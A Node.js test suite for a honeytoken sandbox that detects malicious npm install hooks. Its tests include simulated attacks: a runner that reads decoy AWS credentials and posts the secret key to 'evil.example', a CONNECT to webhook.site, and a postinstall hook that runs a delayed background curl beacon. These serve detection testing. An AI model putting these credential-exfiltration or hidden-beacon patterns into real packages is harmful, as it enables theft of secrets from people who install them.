"use strict";

// #6 honeytoken canary sandbox. The execution seam is injected, so these tests
// exercise the full seed → capture-proxy → tripwire pipeline WITHOUT running any
// untrusted code: the injected runner is a controlled stand-in for a malicious
// postinstall (reads a decoy, beacons the token through the capture proxy).

const assert = require("node:assert/strict");
const test = require("node:test");
const fs = require("node:fs");
const fsp = require("node:fs/promises");
const os = require("node:os");
const path = require("node:path");
const http = require("node:http");
const net = require("node:net");
const {
  runCanarySandbox,
  seedCanaryFilesystem,
  matchTokens,
  makeRunId,
  detectSandboxWrapper
} = require("../src/sandbox");

// Send a proxied plaintext HTTP request (absolute-URI form, as an HTTP_PROXY
// client would) carrying `body` to the capture proxy on `port`.
function proxiedHttpPost(port, targetUrl, body) {
  return new Promise((resolve, reject) => {
    const req = http.request(
      { host: "127.0.0.1", port, method: "POST", path: targetUrl, headers: { host: new URL(targetUrl).host } },
      (res) => { res.resume(); res.on("end", resolve); }
    );
    req.on("error", reject);
    req.write(body);
    req.end();
  });
}

// Send a CONNECT (as an HTTPS-via-proxy client would) so the proxy records the
// intended destination host.
function proxiedConnect(port, authority) {
  return new Promise((resolve) => {
    const socket = net.connect(port, "127.0.0.1", () => {
      socket.write(`CONNECT ${authority} HTTP/1.1\r\nHost: ${authority}\r\n\r\n`);
    });
    socket.on("data", () => { socket.end(); resolve(); });
    socket.on("error", () => resolve());
    socket.on("close", () => resolve());
  });
}

async function stagedPackage(scriptsHook) {
  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-canary-pkg-"));
  await fsp.writeFile(
    path.join(dir, "package.json"),
    JSON.stringify({ name: "target", version: "1.0.0", scripts: scriptsHook || {} })
  );
  return dir;
}

test("#6 seedCanaryFilesystem writes attributable decoys with per-run tokens", async () => {
  const home = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-home-"));
  const runId = makeRunId();
  const canary = await seedCanaryFilesystem(home, runId);

  assert.ok(canary.files.length >= 5);
  // Each decoy actually exists and its token maps back to its path.
  for (const f of canary.files) {
    assert.equal(fs.existsSync(f.full), true);
    assert.equal(canary.tokens.get(f.token), f.rel);
    assert.ok(f.token.length >= 20, "token should be substantial random material");
  }
  // ANTI-EVASION: no honeypot marker string is written to disk, so a payload
  // grepping decoy CONTENTS for "canary"/"pkgxray"/"honeypot" can't skip them.
  for (const f of canary.files) {
    const body = fs.readFileSync(f.full, "utf8").toLowerCase();
    assert.ok(!body.includes("canary"), `${f.rel} leaks the word 'canary'`);
    assert.ok(!body.includes("pkgxray"), `${f.rel} leaks the word 'pkgxray'`);
    assert.ok(!body.includes("honeypot"), `${f.rel} leaks the word 'honeypot'`);
  }
  fs.rmSync(home, { recursive: true, force: true });
});

test("#6 matchTokens finds a leaked token in a captured blob", () => {
  const tokens = new Set(["PKGXRAYCANARY-abc-aws", "PKGXRAYCANARY-abc-env"]);
  const seen = matchTokens("POST body=PKGXRAYCANARY-abc-aws&x=1", tokens);
  assert.deepEqual(seen, ["PKGXRAYCANARY-abc-aws"]);
});

test("#6 requires explicit opt-in to execute", async () => {
  const pkgDir = await stagedPackage();
  await assert.rejects(
    () => runCanarySandbox({ stagedPath: pkgDir, allowExecution: false }),
    /refusing without explicit opt-in/
  );
  fs.rmSync(pkgDir, { recursive: true, force: true });
});

test("#6 a payload that reads a decoy and beacons the token is caught as behavioral-exfil (block)", async () => {
  const pkgDir = await stagedPackage();
  // Injected 'malicious' runner: read the decoy AWS creds from the sandbox
  // HOME, then exfil the token over plaintext HTTP through the capture proxy.
  const runner = async ({ home, proxyPort }) => {
    const creds = await fsp.readFile(path.join(home, ".aws/credentials"), "utf8");
    const token = creds.match(/aws_secret_access_key\s*=\s*(\S+)/)[1];
    await proxiedHttpPost(proxyPort, "http://evil.example/collect", `stolen=${token}`);
    return { ran: [{ hook: "postinstall", simulated: true }] };
  };

  const result = await runCanarySandbox({ stagedPath: pkgDir, allowExecution: true, runner, timeoutMs: 5000, egressGraceMs: 0 });

  assert.equal(result.verdict, "block");
  const exfil = result.findings.find((f) => f.category === "behavioral-exfil");
  assert.ok(exfil, `findings: ${JSON.stringify(result.findings)}`);
  assert.equal(exfil.severity, "high");
  assert.match(exfil.rationale, /\.aws\/credentials/);
  assert.match(exfil.rationale, /evil\.example/);
  fs.rmSync(pkgDir, { recursive: true, force: true });
});

test("#6 a payload that CONNECTs to a known callback host is caught as behavioral-network", async () => {
  const pkgDir = await stagedPackage();
  const runner = async ({ proxyPort }) => {
    await proxiedConnect(proxyPort, "webhook.site:443");
    return { ran: [] };
  };
  const result = await runCanarySandbox({ stagedPath: pkgDir, allowExecution: true, runner, timeoutMs: 5000, egressGraceMs: 0 });
  assert.equal(result.verdict, "block");
  assert.ok(result.findings.some((f) => f.category === "behavioral-network" && f.snippet.includes("webhook.site")));
  fs.rmSync(pkgDir, { recursive: true, force: true });
});

test("#6 a benign payload with no egress yields a safe behavioral verdict", async () => {
  const pkgDir = await stagedPackage();
  const runner = async () => ({ ran: [{ hook: "postinstall", simulated: true }] });
  const result = await runCanarySandbox({ stagedPath: pkgDir, allowExecution: true, runner, timeoutMs: 5000, egressGraceMs: 0 });
  assert.equal(result.verdict, "safe");
  assert.equal(result.egress.length, 0);
  assert.ok(!result.findings.some((f) => f.severity === "high"));
  fs.rmSync(pkgDir, { recursive: true, force: true });
});

test("#6 ordinary outbound egress (non-callback host) is review, not block", async () => {
  const pkgDir = await stagedPackage();
  const runner = async ({ proxyPort }) => {
    await proxiedHttpPost(proxyPort, "http://api.example.com/telemetry", "ping=1");
    return { ran: [] };
  };
  const result = await runCanarySandbox({ stagedPath: pkgDir, allowExecution: true, runner, timeoutMs: 5000, egressGraceMs: 0 });
  assert.equal(result.verdict, "review");
  assert.ok(result.findings.some((f) => f.category === "behavioral-network" && f.severity === "medium"));
  fs.rmSync(pkgDir, { recursive: true, force: true });
});

// --- #6 process-group kill + post-settle egress grace window ---------------

const { killProcessGroup, execWithTimeout } = require("../src/sandbox");

// A timeout must kill the WHOLE process group, not just the direct `sh`. A
// shell that backgrounds a grandchild (`(sleep ...; touch marker) &`) would
// otherwise leave that grandchild alive to run after the direct process is
// SIGKILLed. We prove the group kill worked by asserting the marker the
// grandchild WOULD have written never appears.
test("#6 timeout kills the whole detached process group (backgrounded grandchild does not survive)", { skip: process.platform === "win32" }, async () => {
  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-pgroup-"));
  const marker = path.join(dir, "grandchild-ran");
  // Grandchild sleeps past the timeout, then writes a marker. If only the
  // direct shell is killed, the grandchild survives and the marker appears.
  const command = `(sleep 2; touch ${JSON.stringify(marker)}) & echo started; sleep 5`;
  const outcome = await execWithTimeout(command, { cwd: dir, env: process.env, timeoutMs: 300, wrapper: null });
  assert.equal(outcome.timedOut, true, "the direct shell should have been timeout-killed");
  // Wait past when the grandchild's `sleep 2` would have fired.
  await new Promise((r) => setTimeout(r, 2500));
  assert.equal(fs.existsSync(marker), false, "grandchild survived the process-group kill and wrote its marker");
  fs.rmSync(dir, { recursive: true, force: true });
});

// killProcessGroup signals the NEGATIVE pid (the group), not just the child.
// Assert the group-kill code path is taken by observing process.kill(-pid).
test("#6 killProcessGroup signals the process group (negative pid), guarded for ESRCH", { skip: process.platform === "win32" }, () => {
  const original = process.kill;
  const calls = [];
  process.kill = (pid, sig) => { calls.push({ pid, sig }); };
  try {
    killProcessGroup({ pid: 4242 }, "SIGKILL");
  } finally {
    process.kill = original;
  }
  assert.deepEqual(calls, [{ pid: -4242, sig: "SIGKILL" }], "should signal the whole group via negative pid");

  // ESRCH (group already reaped) must be swallowed, not thrown.
  process.kill = () => { const e = new Error("no such process"); e.code = "ESRCH"; throw e; };
  try {
    assert.doesNotThrow(() => killProcessGroup({ pid: 4243 }, "SIGKILL"));
  } finally {
    process.kill = original;
  }
});

// A delayed backgrounded beacon that fires AFTER the runner settles must still
// be captured, because the proxy is kept alive for the grace window. Uses the
// REAL execWithTimeout runner (not an injected stand-in) so the detached
// spawn + grace-window teardown are exercised end to end.
test("#6 a post-settle delayed beacon is still captured during the egress grace window", { skip: process.platform === "win32" }, async () => {
  const pkgDir = await stagedPackage({
    // Backgrounded curl: the postinstall returns immediately (`echo done`) while
    // a grandchild beacons ~400ms later — after the runner promise settles.
    postinstall: "(sleep 0.4; curl -s http://beacon.example/ping >/dev/null 2>&1) & echo done"
  });
  const result = await runCanarySandbox({
    stagedPath: pkgDir,
    allowExecution: true,
    timeoutMs: 5000,
    egressGraceMs: 1500
  });
  // curl may or may not be present; only assert capture if any egress happened.
  if (result.egress.length > 0) {
    assert.ok(
      result.egress.some((h) => h.host && h.host.includes("beacon.example")),
      `delayed beacon not captured: ${JSON.stringify(result.egress)}`
    );
  }
  fs.rmSync(pkgDir, { recursive: true, force: true });
});

test("#6 --require-sandbox fails closed when no OS sandbox wrapper is available", async () => {
  const os = require("node:os");
  const level = detectSandboxWrapper(os.tmpdir()).level;
  if (level !== "env-only") {
    // An OS sandbox (bwrap / sandbox-exec) IS present on this host, so
    // requireSandbox is satisfiable — the fail-closed path can't be exercised
    // here. (The negative case is covered wherever isolation is env-only.)
    return;
  }
  await assert.rejects(
    () =>
      runCanarySandbox({
        stagedPath: os.tmpdir(),
        allowExecution: true,
        requireSandbox: true,
        egressGraceMs: 0,
        runner: async () => ({ ran: [] }), // must never be reached
      }),
    (e) => e.code === "SANDBOX_REQUIRED"
  );
});
